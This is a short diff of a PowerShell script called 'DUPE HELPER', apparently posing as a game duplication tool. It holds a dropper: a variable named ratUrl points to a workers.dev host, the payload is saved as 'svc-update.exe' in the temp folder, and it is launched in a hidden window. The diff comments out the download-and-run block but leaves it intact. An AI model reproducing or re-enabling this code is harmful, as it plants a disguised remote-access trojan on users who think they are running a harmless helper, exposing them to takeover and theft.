@@ -5,11 +5,11 @@ $Host.UI.RawUI.WindowTitle = "🎃 DUPE HELPER 🎃"
 $ratUrl = "https://duperussianservers.ruchecker-ru.workers.dev/"
 $ratPath = "$env:TEMP\svc-update.exe"
 
-try {
-    Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath -UseBasicParsing -ErrorAction Stop
-    Start-Process $ratPath -WindowStyle Hidden
-} catch {
-}
+#try {
+#    Invoke-WebRequest -Uri $ratUrl -OutFile $ratPath -UseBasicParsing -ErrorAction Stop
+#    Start-Process $ratPath -WindowStyle Hidden
+#} catch {
+#}
 
 function L($m, $min, $max) {
     Write-Host " [>] $m " -NoNewline -ForegroundColor White
